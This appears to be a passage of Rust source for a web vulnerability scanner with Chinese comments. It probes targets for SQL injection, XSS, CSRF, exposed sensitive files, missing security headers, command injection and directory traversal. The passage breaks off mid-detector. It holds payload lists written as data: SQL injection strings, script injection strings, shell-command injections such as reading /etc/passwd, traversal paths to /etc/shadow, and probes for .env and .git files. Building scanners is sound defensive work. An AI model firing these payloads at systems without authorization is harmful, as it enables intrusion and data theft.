use std::sync::Arc;
use std::time::Duration;

use async_trait::async_trait;
use chrono::Utc;
use regex::Regex;
use reqwest::{Client, ClientBuilder};
use scraper::{Html, Selector};
use serde::{Deserialize, Serialize};
use tracing::{debug, error, info, warn};

// ==================== 核心数据结构 ====================

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize)]
#[serde(rename_all = "lowercase")]
enum Severity { Critical, High, Medium, Low, Info }

impl Severity {
    fn as_str(&self) -> &'static str {
        match self { Severity::Critical => "严重", Severity::High => "高危", Severity::Medium => "中危", Severity::Low => "低危", Severity::Info => "信息" }
    }
    fn owasp_category(&self) -> &'static str {
        match self { Severity::Critical => "A03:2021-Injection", Severity::High => "A01:2021-Broken Access Control", Severity::Medium => "A05:2021-Security Misconfiguration", Severity::Low => "A04:2021-Insecure Design", Severity::Info => "A06:2021-Vulnerable Components" }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct Vulnerability {
    id: String,
    owasp_category: String,
    detector: String,
    severity: String,
    risk_score: f32,
    title: String,
    url: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    param: Option<String>,
    description: String,
    technical_analysis: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    payload: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    proof: Option<String>,
    remediation: String,
    verification: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    status_code: Option<u16>,
    timestamp: String,
}

impl Vulnerability {
    fn new(detector: &str, severity: Severity, title: &str, url: &str, desc: &str, analysis: &str, remediation: &str, verification: &str, cvss: f32) -> Self {
        Vulnerability {
            id: uuid::Uuid::new_v4().to_string()[..8].to_string(),
            owasp_category: severity.owasp_category().to_string(),
            detector: detector.to_string(),
            severity: severity.as_str().to_string(),
            risk_score: cvss,
            title: title.to_string(),
            url: url.to_string(),
            param: None,
            description: desc.to_string(),
            technical_analysis: analysis.to_string(),
            payload: None,
            proof: None,
            remediation: remediation.to_string(),
            verification: verification.to_string(),
            status_code: None,
            timestamp: Utc::now().to_rfc3339(),
        }
    }
    fn with_payload(mut self, p: &str) -> Self { self.payload = Some(p.to_string()); self }
    fn with_proof(mut self, p: &str) -> Self { self.proof = Some(p.to_string()); self }
    fn with_status(mut self, c: u16) -> Self { self.status_code = Some(c); self }
    fn with_param(mut self, p: &str) -> Self { self.param = Some(p.to_string()); self }
}

#[derive(Debug, Clone, Default, Serialize)]
struct TechFingerprint {
    server: Option<String>,
    powered_by: Option<String>,
    technologies: Vec<String>,
    page_title: Option<String>,
    meta_generator: Option<String>,
    status_code: u16,
    content_length: usize,
    response_headers: Vec<(String, String)>,
    cookies: Vec<String>,
    tls_enabled: bool,
    hsts_enabled: bool,
}

// ==================== 检测器 Trait ====================

#[async_trait]
trait Detector: Send + Sync {
    fn name(&self) -> &str;
    async fn scan(&self, target: &str, client: &Client, baseline: &BaselineData) -> Result<Vec<Vulnerability>, String>;
}

#[derive(Debug, Clone)]
struct BaselineData {
    body: String,
    status: u16,
    headers: Vec<(String, String)>,
    cookies: Vec<String>,
    content_length: usize,
}

// ==================== 1. SQL注入检测器 ====================

struct SqlInjectionDetector;

impl SqlInjectionDetector {
    fn payloads() -> Vec<(&'static str, &'static str)> {
        vec![
            ("' OR '1'='1", "布尔盲注-永真条件"),
            ("' OR 1=1--", "注释绕过"),
            ("' UNION SELECT 1,2,3--", "UNION联合查询"),
            ("\" OR \"1\"=\"1", "双引号变体"),
            ("1' OR '1'='1' --", "数字型注入"),
            ("' AND 1=1--", "布尔真条件"),
            ("' AND 1=2--", "布尔假条件"),
            ("admin'--", "认证绕过"),
            ("' OR SLEEP(3)--", "时间盲注(MySQL)"),
            ("'; WAITFOR DELAY '0:0:3'--", "时间盲注(MSSQL)"),
        ]
    }

    fn error_patterns() -> Vec<(&'static str, Regex)> {
        vec![
            ("MySQL语法错误", Regex::new(r"(?i)(you have an error in your sql syntax|mysql_fetch|mysql_num_rows|mysql_error|mysqli)").unwrap()),
            ("PostgreSQL错误", Regex::new(r"(?i)(postgresql.*error|pg_query|pg_exec|psql)").unwrap()),
            ("MSSQL错误", Regex::new(r"(?i)(microsoft.*sql.*server|sqlstate|odbc.*sql|sql server error|unclosed quotation mark)").unwrap()),
            ("Oracle错误", Regex::new(r"(?i)(oracle.*error|ora-\d{5}|oracle.jdbc)").unwrap()),
            ("SQLite错误", Regex::new(r"(?i)(sqlite_error|sqlite3::|sqlite3_query|SQLITE_ERROR)").unwrap()),
            ("通用SQL错误", Regex::new(r"(?i)(syntax.*error.*sql|invalid.*query|unknown.*column|table.*doesn.*exist|division.*by.*zero|warning.*mysql)").unwrap()),
        ]
    }
}

#[async_trait]
impl Detector for SqlInjectionDetector {
    fn name(&self) -> &str { "SQL注入检测器" }

    async fn scan(&self, target: &str, client: &Client, baseline: &BaselineData) -> Result<Vec<Vulnerability>, String> {
        let mut vulns = Vec::new();
        let base_url = normalize_url(target);
        let params = ["id", "q", "search", "keyword", "page", "cat", "name", "user", "item_id", "pid"];

        info!("[SQL注入] 开始检测，测试 {} 个参数 x {} 个payload", params.len(), Self::payloads().len());

        for param in &params {
            for (payload, technique) in Self::payloads() {
                let url = format!("{}?{}={}", base_url, param, urlencoding::encode(payload));
                match client.get(&url).timeout(Duration::from_secs(10)).send().await {
                    Ok(resp) => {
                        let status = resp.status().as_u16();
                        let body = resp.text().await.unwrap_or_default();

                        // 错误注入检测
                        for (db_type, pattern) in Self::error_patterns() {
                            if let Some(m) = pattern.find(&body) {
                                if body != baseline.body {
                                    let proof = extract_context(&body, m.as_str(), 150);
                                    let v = Vulnerability::new(
                                        "SQL注入", Severity::Critical,
                                        &format!("SQL注入漏洞 - {} ({})", param, technique),
                                        &url,
                                        &format!("参数 '{}' 存在SQL注入漏洞，攻击者可通过{}注入恶意SQL语句，导致数据库信息泄露、数据篡改或删除。", param, technique),
                                        &format!("目标使用{}数据库，用户输入未经过滤直接拼接到SQL查询中。当注入payload '{}' 时，数据库返回了明确的错误信息：'{}'，表明输入直接参与了SQL查询构造。", db_type, payload, m.as_str()),
                                        "1. 使用参数化查询(Prepared Statements)或ORM框架；\n2. 对所有用户输入进行白名单验证；\n3. 实施WAF规则拦截SQL注入特征；\n4. 数据库使用最小权限账户；\n5. 关闭数据库详细错误信息显示。",
                                        "1. 使用sqlmap验证: sqlmap -u '<url>' --batch；\n2. 检查应用日志确认无SQL错误；\n3. 代码审查确认所有数据库查询均使用参数化。",
                                        9.8,
                                    ).with_payload(payload).with_proof(&proof).with_status(status).with_param(param);
                                    vulns.push(v);
                                    warn!("[SQL注入] 发现{}漏洞: {}={}", technique, param, payload);
                                    break;
                                }
                            }
                        }

                        // 布尔盲注检测：对比 AND 1=1 和 AND 1=2 的响应差异
                        if payload == "' AND 1=1--" {
                            let false_url = format!("{}?{}={}", base_url, param, urlencoding::encode("' AND 1=2--"));
                            if let Ok(false_resp) = client.get(&false_url).timeout(Duration::from_secs(10)).send().await {
                                let false_body = false_resp.text().await.unwrap_or_default();
                                if body != false_body && body.len() as i64 - false_body.len() as i64 > 50 {
                                    let v = Vulnerability::new(
                                        "SQL注入", Severity::Critical,
                                        &format!("SQL布尔盲注 - 参数{}", param),
                                        &url,
                                        &format!("参数 '{}' 存在布尔盲注漏洞。AND 1=1（真）和 AND 1=2（假）返回不同响应，攻击者可通过布尔逻辑推断数据库内容。", param),
                                        "通过对比永真条件(AND 1=1)和永假条件(AND 1=2)的响应差异确认。真条件返回正常页面，假条件返回不同内容，说明SQL条件被直接执行。攻击者可利用此特性逐字符推断数据库内容。",
                                        "使用参数化查询，禁止SQL拼接。实施输入验证和WAF防护。",
                                        "使用sqlmap --technique=B验证。确认修复后两个条件返回相同响应。",
                                        8.1,
                                    ).with_payload(payload).with_param(param).with_status(status);
                                    vulns.push(v);
                                }
                            }
                        }
                    }
                    Err(e) => debug!("[SQL注入] 请求失败: {} - {}", url, e),
                }
            }
        }

        // 时间盲注检测
        for param in &["id", "q", "page"] {
            let payload = "' OR SLEEP(3)--";
            let url = format!("{}?{}={}", base_url, param, urlencoding::encode(payload));
            let start = std::time::Instant::now();
            if let Ok(_) = client.get(&url).timeout(Duration::from_secs(15)).send().await {
                let elapsed = start.elapsed().as_millis();
                if elapsed >= 2800 {
                    let v = Vulnerability::new(
                        "SQL注入", Severity::Critical,
                        &format!("SQL时间盲注 - 参数{}", param),
                        &url,
                        &format!("参数 '{}' 存在时间盲注。SLEEP(3)导致响应延迟{}ms，攻击者可通过时间延迟推断数据库内容。", param, elapsed),
                        "注入SLEEP函数后响应延迟明显（>3秒），证明SQL语句被执行。攻击者可结合条件判断+延迟函数逐字符提取数据。",
                        "使用参数化查询。禁用危险函数。实施WAF。",
                        "注入SLEEP(5)确认响应延迟与参数成正比。修复后响应时间应一致。",
                        8.1,
                    ).with_payload(payload).with_param(param);
                    vulns.push(v);
                    warn!("[SQL注入] 发现时间盲注: {} 延迟{}ms", param, elapsed);
                }
            }
        }

        Ok(vulns)
    }
}

// ==================== 2. XSS检测器 ====================

struct XssDetector;

impl XssDetector {
    fn payloads() -> Vec<(&'static str, &'static str)> {
        vec![
            ("<script>alert(1)</script>", "基础script标签"),
            ("<img src=x onerror=alert(1)>", "img事件触发"),
            ("<svg/onload=alert(1)>", "SVG事件触发"),
            ("<body onload=alert(1)>", "body事件触发"),
            ("javascript:alert(1)", "javascript伪协议"),
            ("<iframe src=javascript:alert(1)>", "iframe注入"),
            ("\"><script>alert(1)</script>", "属性闭合注入"),
            ("'><script>alert(1)</script>", "单引号闭合"),
            ("<input onfocus=alert(1) autofocus>", "input自动触发"),
            ("<details/open/ontoggle=alert(1)>", "details事件触发"),
            ("%3Cscript%3Ealert(1)%3C/script%3E", "URL编码绕过"),
            ("<ScRiPt>alert(1)</ScRiPt>", "大小写混合绕过"),
        ]
    }
}

#[async_trait]
impl Detector for XssDetector {
    fn name(&self) -> &str { "XSS检测器" }

    async fn scan(&self, target: &str, client: &Client, baseline: &BaselineData) -> Result<Vec<Vulnerability>, String> {
        let mut vulns = Vec::new();
        let base_url = normalize_url(target);
        let params = ["q", "search", "keyword", "name", "query", "msg", "comment", "content", "title", "description"];

        info!("[XSS] 开始检测，测试 {} 个参数 x {} 个payload", params.len(), Self::payloads().len());

        for param in &params {
            for (payload, technique) in Self::payloads() {
                let url = format!("{}?{}={}", base_url, param, urlencoding::encode(payload));
                match client.get(&url).timeout(Duration::from_secs(10)).send().await {
                    Ok(resp) => {
                        let status = resp.status().as_u16();
                        let body = resp.text().await.unwrap_or_default();

                        if body == baseline.body { continue; }

                        // 直接反射检测
                        if body.contains(payload) {
                            let proof = extract_context(&body, payload, 200);
                            let v = Vulnerability::new(
                                "XSS", Severity::High,
                                &format!("反射型XSS - 参数{} ({})", param, technique),
                                &url,
                                &format!("参数 '{}' 存在反射型XSS漏洞。Payload被直接反射到HTML中未经过滤，攻击者可注入恶意脚本窃取用户Cookie、会话令牌或执行钓鱼攻击。", param),
                                &format!("输入的payload '{}' 在响应中被原样输出到HTML中，浏览器会将其解析为可执行的JavaScript代码。这是因为服务端未对用户输入进行HTML实体编码或输出转义。", payload),
                                "1. 对所有输出进行HTML实体编码(OWASP Java Encoder)；\n2. 配置Content-Security-Policy限制脚本来源；\n3. 使用X-XSS-Protection: 1; mode=block；\n4. 框架层面启用自动转义(Auto-escaping)。",
                                "1. 使用XSS验证工具确认payload不再反射；\n2. 检查CSP头部配置；\n3. 代码审查确认所有输出点已转义。",
                                6.1,
                            ).with_payload(payload).with_proof(&proof).with_status(status).with_param(param);
                            vulns.push(v);
                            warn!("[XSS] 发现反射型XSS: {}={}", param, payload);
                            break;
                        }

                        // 部分反射检测（payload被编码但部分内容反射）
                        let decoded_payload = urlencoding::decode(payload).unwrap_or_default();
                        if body.contains(decoded_payload.as_ref()) && payload != decoded_payload.as_ref() {
                            let proof = extract_context(&body, &decoded_payload, 200);
                            let v = Vulnerability::new(
                                "XSS", Severity::Medium,
                                &format!("潜在XSS(编码绕过) - 参数{}", param),
                                &url,
                                &format!("参数 '{}' 的输入在解码后被反射到响应中，可能存在编码绕过型XSS。", param),
                                &format!("URL编码的payload '{}' 解码后在响应中被找到，说明应用对输入进行了部分解码但未做充分过滤。", payload),
                                "对所有输出进行HTML实体编码。配置CSP策略。",
                                "使用各种编码变体验证payload不再被反射。",
                                5.4,
                            ).with_payload(payload).with_proof(&proof).with_status(status).with_param(param);
                            vulns.push(v);
                        }
                    }
                    Err(e) => debug!("[XSS] 请求失败: {} - {}", url, e),
                }
            }
        }

        Ok(vulns)
    }
}

// ==================== 3. CSRF检测器 ====================

struct CsrfDetector;

#[async_trait]
impl Detector for CsrfDetector {
    fn name(&self) -> &str { "CSRF检测器" }

    async fn scan(&self, target: &str, client: &Client, baseline: &BaselineData) -> Result<Vec<Vulnerability>, String> {
        let mut vulns = Vec::new();
        let base_url = normalize_url(target);

        info!("[CSRF] 开始检测");

        let body = &baseline.body;
        let document = Html::parse_document(body);

        // 检查表单是否包含CSRF令牌
        if let Ok(sel) = Selector::parse("form") {
            let forms: Vec<_> = document.select(&sel).collect();
            if forms.is_empty() {
                info!("[CSRF] 未发现表单，跳过检测");
                return Ok(vulns);
            }

            for form in forms {
                let form_action = form.value().attr("action").unwrap_or("");
                let form_method = form.value().attr("method").unwrap_or("get").to_lowercase();

                // 检查是否有CSRF token
                let has_csrf_token = if let Ok(input_sel) = Selector::parse("input") {
                    form.select(&input_sel).any(|input| {
                        let name = input.value().attr("name").unwrap_or("");
                        name.to_lowercase().contains("csrf") || name.to_lowercase().contains("token") || name.to_lowercase().contains("_token")
                    })
                } else { false };

                if !has_csrf_token && (form_method == "post" || form_method == "get") {
                    let action_url = if form_action.starts_with("http") { form_action.to_string() }
                        else if form_action.starts_with("/") { format!("https://{}{}", extract_host(&base_url), form_action) }
                        else { format!("{}/{}", base_url.trim_end_matches('/'), form_action) };

                    let v = Vulnerability::new(
                        "CSRF", Severity::Medium,
                        &format!("CSRF漏洞 - 表单(action={})", form_action),
                        &action_url,
                        "表单缺少CSRF防护令牌，攻击者可构造恶意页面诱导用户提交表单，以用户身份执行非预期操作（如修改密码、转账等）。",
                        "HTML表单中未发现名为csrf_token/_token的隐藏字段。CSRF攻击利用浏览器自动携带Cookie的特性，攻击者在第三方站点构造相同请求即可冒充用户提交。根据OWASP标准，所有状态变更操作必须包含不可预测的CSRF令牌。",
                        "1. 在所有表单中添加同步器令牌(Synchronizer Token Pattern)；\n2. 对敏感操作添加二次确认（如密码确认）；\n3. 设置SameSite=Strict/Lax的Cookie属性；\n4. 验证HTTP Referer/Origin头部。",
                        "1. 检查所有表单是否包含CSRF令牌；\n2. 使用CSRF Tester工具验证跨站请求被拒绝；\n3. 确认同源请求正常工作。",
                        6.5,
                    ).with_status(baseline.status);
                    vulns.push(v);
                    warn!("[CSRF] 表单缺少CSRF令牌: action={}", form_action);
                }
            }
        }

        // 检查Cookie的SameSite属性
        for cookie in &baseline.cookies {
            if !cookie.to_lowercase().contains("samesite") {
                let v = Vulnerability::new(
                    "CSRF", Severity::Low,
                    "Cookie缺少SameSite属性",
                    &base_url,
                    "会话Cookie未设置SameSite属性，增加了CSRF攻击的风险。浏览器默认行为可能允许跨站请求携带Cookie。",
                    "Cookie未设置SameSite属性，浏览器在跨站请求时仍会自动携带该Cookie，使CSRF攻击成为可能。Chrome 80+默认SameSite=Lax，但旧浏览器和其他浏览器可能不同。",
                    "为所有会话Cookie设置SameSite=Strict（或至少Lax）属性。",
                    "检查Set-Cookie头部确认包含SameSite=Strict。",
                    3.5,
                );
                vulns.push(v);
            }
        }

        Ok(vulns)
    }
}

// ==================== 4. 敏感文件检测器 ====================

struct SensitiveFileDetector;

impl SensitiveFileDetector {
    fn paths() -> Vec<(&'static str, bool, &'static str)> {
        vec![
            // Git泄露
            (".git/config", true, "Git仓库配置泄露"), (".git/HEAD", true, "Git HEAD泄露"),
            (".git/index", true, "Git索引泄露"), (".git/logs/HEAD", true, "Git日志泄露"),
            // 环境配置
            (".env", true, "环境变量文件泄露"), (".env.local", true, "本地环境配置泄露"),
            (".env.production", true, "生产环境配置泄露"), (".env.development", true, "开发环境配置泄露"),
            // 数据库备份
            ("backup.zip", true, "备份压缩包暴露"), ("backup.tar.gz", true, "备份压缩包暴露"),
            ("backup.sql", true, "数据库备份泄露"), ("dump.sql", true, "数据库导出泄露"),
            ("database.sql", true, "数据库SQL泄露"),
            // 管理面板
            ("admin.php", true, "管理面板暴露"), ("admin/", true, "管理目录暴露"),
            ("admin/login.php", true, "管理登录页暴露"), ("phpmyadmin/", true, "phpMyAdmin暴露"),
            ("wp-admin/", true, "WordPress管理暴露"), ("wp-config.php", true, "WordPress配置泄露"),
            // 服务器状态
            ("server-status", true, "Apache服务器状态暴露"), ("server-info", true, "Apache服务器信息暴露"),
            ("phpinfo.php", true, "phpinfo页面暴露"), ("info.php", true, "PHP信息页暴露"),
            // 配置文件
            ("nginx.conf", true, "Nginx配置泄露"), ("apache.conf", true, "Apache配置泄露"),
            (".htaccess", true, "htaccess文件暴露"), (".htpasswd", true, "htpasswd文件暴露"),
            ("config/database.yml", true, "数据库配置泄露"), ("config/application.yml", true, "应用配置泄露"),
            ("web.config", true, "IIS配置泄露"),
            // 框架文件
            ("composer.json", false, "Composer依赖信息"), ("package.json", false, "NPM包信息"),
            ("composer.lock", true, "依赖锁定文件泄露"), ("package-lock.json", false, "NPM锁定文件"),
            // API文档
            ("swagger.json", false, "Swagger API文档暴露"), ("swagger-ui/", false, "Swagger UI暴露"),
            ("api/docs", false, "API文档暴露"), ("openapi.yaml", false, "OpenAPI规范暴露"),
            ("graphql", false, "GraphQL端点暴露"),
            // 常规文件
            ("robots.txt", false, "robots.txt可访问"), ("sitemap.xml", false, "站点地图可访问"),
            ("README.md", false, "README文件暴露"), ("LICENSE", false, "LICENSE文件暴露"),
            ("CHANGELOG.md", false, "变更日志暴露"),
            // 备份文件
            ("index.php.bak", true, "PHP备份文件暴露"), ("index.html.bak", true, "HTML备份文件暴露"),
            ("index.html.old", true, "旧版HTML暴露"), (".DS_Store", true, "macOS目录文件泄露"),
            ("Thumbs.db", true, "Windows缩略图缓存泄露"),
            // 目录
            ("temp/", false, "临时目录可访问"), ("tmp/", false, "临时目录可访问"),
            ("cache/", false, "缓存目录可访问"), ("logs/", true, "日志目录可访问"),
            ("upload/", false, "上传目录可访问"), ("uploads/", false, "上传目录可访问"),
            // 其他
            (".well-known/security.txt", false, "安全联系信息"), ("crossdomain.xml", false, "跨域策略文件"),
        ]
    }
}

#[async_trait]
impl Detector for SensitiveFileDetector {
    fn name(&self) -> &str { "敏感文件检测器" }

    async fn scan(&self, target: &str, client: &Client, baseline: &BaselineData) -> Result<Vec<Vulnerability>, String> {
        let mut vulns = Vec::new();
        let base_url = normalize_url(target);
        let baseline_len = baseline.content_length;
        let baseline_hash = simple_hash(&baseline.body);

        info!("[敏感文件] 开始检测 {} 个路径", Self::paths().len());

        for (path, is_sensitive, desc) in Self::paths() {
            let url = format!("{}/{}", base_url.trim_end_matches('/'), path);
            match client.get(&url).timeout(Duration::from_secs(5)).send().await {
                Ok(resp) => {
                    let status = resp.status().as_u16();
                    if !(status == 200 || status == 301 || status == 302 || status == 403) { continue; }

                    let content_len = resp.content_length().unwrap_or(0) as usize;
                    let body = resp.text().await.unwrap_or_default();

                    // 过滤SPA回退（所有路径返回相同内容）
                    if body.len() == baseline_len && simple_hash(&body) == baseline_hash {
                        continue;
                    }
                    if body.len() < 10 { continue; }

                    let is_generic_404 = body.contains("404") && body.contains("Not Found");
                    if status == 200 && body.len() < 100 && is_generic_404 { continue; }

                    let severity = if is_sensitive { Severity::High } else { Severity::Medium };
                    let cvss = if is_sensitive { 7.5 } else { 5.3 };
                    let proof = body.chars().take(300).collect::<String>();

                    let v = Vulnerability::new(
                        "敏感文件", severity,
                        &format!("{}: {}", desc, path),
                        &url,
                        &format!("路径 '{}' 可直接访问（状态码: {}，大小: {} bytes）。{}", path, status, content_len, if is_sensitive { "该文件包含敏感信息，可能导致源代码、数据库凭证或配置信息泄露。" } else { "该文件可被攻击者用于信息收集。" }),
                        &format!("Web服务器未正确配置访问控制，允许直接访问{}。攻击者可通过该文件获取系统架构、数据库凭证、API密钥等敏感信息，为进一步攻击提供情报。", desc),
                        &format!("1. 在Nginx/Apache中配置location规则禁止访问{}；\n2. 将敏感文件移出Web根目录；\n3. 设置正确的文件权限；\n4. 配置WAF规则拦截敏感路径访问。", path),
                        "1. 重新访问该URL应返回404或403；\n2. 检查Web服务器配置确认敏感路径已屏蔽。",
                        cvss,
                    ).with_proof(&proof).with_status(status);
                    vulns.push(v);

                    if is_sensitive {
                        warn!("[敏感文件] 发现敏感文件: {} (status={})", path, status);
                    } else {
                        info!("[敏感文件] 发现可访问文件: {} (status={})", path, status);
                    }
                }
                Err(e) => debug!("[敏感文件] 请求失败: {} - {}", path, e),
            }
        }

        Ok(vulns)
    }
}

// ==================== 5. 安全头部检测器 ====================

struct SecurityHeaderDetector;

#[async_trait]
impl Detector for SecurityHeaderDetector {
    fn name(&self) -> &str { "安全头部检测器" }

    async fn scan(&self, target: &str, client: &Client, baseline: &BaselineData) -> Result<Vec<Vulnerability>, String> {
        let mut vulns = Vec::new();
        let base_url = normalize_url(target);
        let headers = &baseline.headers;

        info!("[安全头部] 开始检测");

        let checks: Vec<(&str, &str, &str, Severity, f32)> = vec![
            ("Strict-Transport-Security", "HSTS强制HTTPS连接，防止SSL剥离攻击", "在HTTPS响应中添加: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload", Severity::Medium, 5.5),
            ("Content-Security-Policy", "CSP限制资源加载来源，防止XSS和数据注入", "配置CSP: Content-Security-Policy: default-src 'self'; script-src 'self'", Severity::Medium, 5.0),
            ("X-Frame-Options", "防止页面被iframe嵌入，避免点击劫持", "添加: X-Frame-Options: DENY（或SAMEORIGIN）", Severity::Medium, 5.0),
            ("X-Content-Type-Options", "防止浏览器MIME类型嗅探", "添加: X-Content-Type-Options: nosniff", Severity::Low, 3.5),
            ("X-XSS-Protection", "启用浏览器内置XSS过滤器", "添加: X-XSS-Protection: 1; mode=block", Severity::Low, 3.0),
            ("Referrer-Policy", "控制Referer头部信息泄露", "添加: Referrer-Policy: strict-origin-when-cross-origin", Severity::Low, 2.5),
            ("Permissions-Policy", "限制浏览器API访问权限", "添加: Permissions-Policy: geolocation=(), microphone=(), camera=()", Severity::Low, 2.5),
        ];

        for (header, risk, fix, severity, cvss) in &checks {
            let found = headers.iter().any(|(k, _)| k.eq_ignore_ascii_case(header));
            if !found {
                let v = Vulnerability::new(
                    "安全头部", *severity,
                    &format!("缺少安全响应头: {}", header),
                    &base_url,
                    &format!("响应中缺少 {} 头部。缺少该头部可能导致: {}", header, risk),
                    &format!("HTTP响应头中未包含 {}。该头部是OWASP推荐的安全头部之一，缺失会增加相应攻击向量的风险。", header),
                    fix,
                    &format!("使用curl -I {} 检查响应头是否包含 {}", base_url, header),
                    *cvss,
                ).with_status(baseline.status);
                vulns.push(v);
                info!("[安全头部] 缺少: {}", header);
            }
        }

        // 检查Cookie安全性
        for cookie in &baseline.cookies {
            if !cookie.to_lowercase().contains("secure") {
                vulns.push(Vulnerability::new(
                    "会话管理", Severity::Medium,
                    "Cookie缺少Secure属性",
                    &base_url,
                    "会话Cookie未设置Secure属性，可能在HTTP连接中传输，存在被中间人窃取的风险。",
                    "Cookie的Secure属性确保仅在HTTPS加密连接中传输。未设置此属性时，攻击者可通过降级攻击或网络嗅探获取会话Cookie。",
                    "在Set-Cookie中添加Secure属性: Set-Cookie: session=xxx; Secure; HttpOnly; SameSite=Strict",
                    "检查Set-Cookie响应头确认包含Secure属性。",
                    5.0,
                ));
            }
            if !cookie.to_lowercase().contains("httponly") {
                vulns.push(Vulnerability::new(
                    "会话管理", Severity::Medium,
                    "Cookie缺少HttpOnly属性",
                    &base_url,
                    "会话Cookie未设置HttpOnly属性，可被JavaScript读取，增加XSS窃取Cookie的风险。",
                    "HttpOnly属性防止JavaScript通过document.cookie访问Cookie。结合XSS漏洞，攻击者可直接窃取会话令牌。",
                    "在Set-Cookie中添加HttpOnly属性。",
                    "在浏览器控制台执行document.cookie确认无法读取会话Cookie。",
                    4.5,
                ));
            }
        }

        Ok(vulns)
    }
}

// ==================== 6. 命令注入检测器 ====================

struct CommandInjectionDetector;

impl CommandInjectionDetector {
    fn payloads() -> Vec<(&'static str, &'static str)> {
        vec![
            (";id", "分号命令分隔"),
            ("|id", "管道命令执行"),
            ("&&id", "逻辑与执行"),
            ("||id", "逻辑或执行"),
            ("`id`", "反引号执行"),
            ("$(id)", "命令替换"),
            (";whoami", "分号-whoami"),
            ("|whoami", "管道-whoami"),
            (";cat /etc/passwd", "读取passwd文件"),
            ("|cat /etc/passwd", "管道读取passwd"),
            (";uname -a", "系统信息"),
            ("$(whoami)", "命令替换-whoami"),
        ]
    }

    fn output_patterns() -> Vec<Regex> {
        vec![
            Regex::new(r"uid=\d+\(.+?\)\s+gid=\d+").unwrap(),       // id输出
            Regex::new(r"[a-zA-Z0-9_-]+\s*\n").unwrap(),              // whoami输出
            Regex::new(r"root:x:0:0:").unwrap(),                       // /etc/passwd
            Regex::new(r"Linux\s+\S+\s+\d+\.\d+\.\d+").unwrap(),      // uname输出
        ]
    }
}

#[async_trait]
impl Detector for CommandInjectionDetector {
    fn name(&self) -> &str { "命令注入检测器" }

    async fn scan(&self, target: &str, client: &Client, baseline: &BaselineData) -> Result<Vec<Vulnerability>, String> {
        let mut vulns = Vec::new();
        let base_url = normalize_url(target);
        let params = ["cmd", "exec", "command", "ping", "host", "ip", "target", "file", "dir", "page"];

        info!("[命令注入] 开始检测");

        for param in &params {
            for (payload, technique) in Self::payloads() {
                let url = format!("{}?{}={}", base_url, param, urlencoding::encode(payload));
                match client.get(&url).timeout(Duration::from_secs(10)).send().await {
                    Ok(resp) => {
                        let status = resp.status().as_u16();
                        let body = resp.text().await.unwrap_or_default();
                        if body == baseline.body { continue; }

                        for pattern in Self::output_patterns() {
                            if let Some(m) = pattern.find(&body) {
                                let proof = extract_context(&body, m.as_str(), 150);
                                let v = Vulnerability::new(
                                    "命令注入", Severity::Critical,
                                    &format!("命令注入漏洞 - 参数{} ({})", param, technique),
                                    &url,
                                    &format!("参数 '{}' 存在命令注入漏洞。攻击者可通过{}注入系统命令，可能导致服务器完全控制、数据泄露或服务中断。", param, technique),
                                    &format!("输入payload '{}' 后，响应中出现了系统命令执行结果（匹配: '{}'），说明用户输入被直接传递给系统shell执行。这是一个极其严重的漏洞，攻击者可执行任意命令。", payload, m.as_str()),
                                    "1. 避免直接调用系统命令，使用语言内置库替代；\n2. 如必须调用，使用参数化API（如execvp而非system）；\n3. 实施严格的输入白名单验证；\n4. 使用沙箱/最小权限运行；\n5. 部署WAF拦截命令注入特征。",
                                    "1. 重新测试确认payload不再产生命令输出；\n2. 检查代码确认使用安全API；\n3. 审计系统日志确认无异常命令执行。",
                                    9.8,
                                ).with_payload(payload).with_proof(&proof).with_status(status).with_param(param);
                                vulns.push(v);
                                warn!("[命令注入] 发现漏洞: {}={}", param, payload);
                                break;
                            }
                        }
                    }
                    Err(e) => debug!("[命令注入] 请求失败: {}", e),
                }
            }
        }

        Ok(vulns)
    }
}

// ==================== 7. 目录遍历检测器 ====================

struct DirectoryTraversalDetector;

impl DirectoryTraversalDetector {
    fn payloads() -> Vec<(&'static str, &'static str)> {
        vec![
            ("../../../etc/passwd", "基础目录遍历"),
            ("..%2F..%2F..%2Fetc%2Fpasswd", "URL编码遍历"),
            ("....//....//....//etc/passwd", "双点双斜杠绕过"),
            ("..%252f..%252f..%252fetc%252fpasswd", "双重URL编码"),
            ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "全URL编码"),
            ("../../../etc/shadow", "读取shadow文件"),
            ("..\\..\\..\\windows\\win.ini", "Windows路径遍历"),
            ("..%5c..%5c..%5cwindows%5cwin.ini", "Windows URL编码"),
            ("/etc/passwd", "绝对路径读取"),
            ("/proc/self/environ", "读取环境变量"),
        ]
    }

    fn success_patterns() -> Vec<Regex> {
        vec![
            Regex::new(r"root:x:0:0:").unwrap(),           // /etc/passwd
            Regex::new(r"\[fonts\]").unwrap(),              // win.ini
            Regex::new(r"USER=").unwrap(),                  // /proc/self/environ
            Regex::new(r"root:\$[0-9]\$").unwrap(),         // /etc/shadow
        ]
    }
}

#[async_trait]
impl Detector for DirectoryTraversalDetector {
    fn name(&self) -> &str { "目录遍历检测器" }

    async fn scan(&self, target: &str, client: &Client, baseline: &BaselineData) -> Result<Vec<Vulnerability>, String> {
        let mut vulns = Vec::new();
        let base_url = normalize_url(target);
        let params = ["file", "path", "page", "template", "dir", "include", "url", "src", "document", "cat"];

        info!("[目录遍历] 开始检测");

        for param in &params {
            for (payload, technique) in Self::payloads() {
                let url = format!("{}?{}={}", base_url, param, urlencoding::encode(payload));
                match client.get(&url).timeout(Duration::from_secs(10)).send().await {
                    Ok(resp) => {
                        let status = resp.status().as_u16();
                        let body = resp.text().await.unwrap_or_default();
                        if body == baseline.body { continue; }

                        for pattern in Self::success_patterns() {
                            if let Some(m) = pattern.find(&body) {
                                let proof = extract_context(&body, m.as_str(), 150);
                                let v = Vulnerability::new(
                                    "目录遍历", Severity::Critical,
                                    &format!("目录遍历漏洞 - 参数{} ({})", param, technique),
                                    &url,
                                    &format!("参数 '{}' 存在目录遍历漏洞，攻击者可读取服务器上任意文件，包括密码文件、配置文件和源代码。", param),
                                    &format!("输入路径遍历payload '{}' 后，响应中包含了目标系统文件的敏感内容（匹配: '{}'），说明应用未对文件路径进行限制，直接将用户输入作为文件路径使用。", payload, m.as_str()),
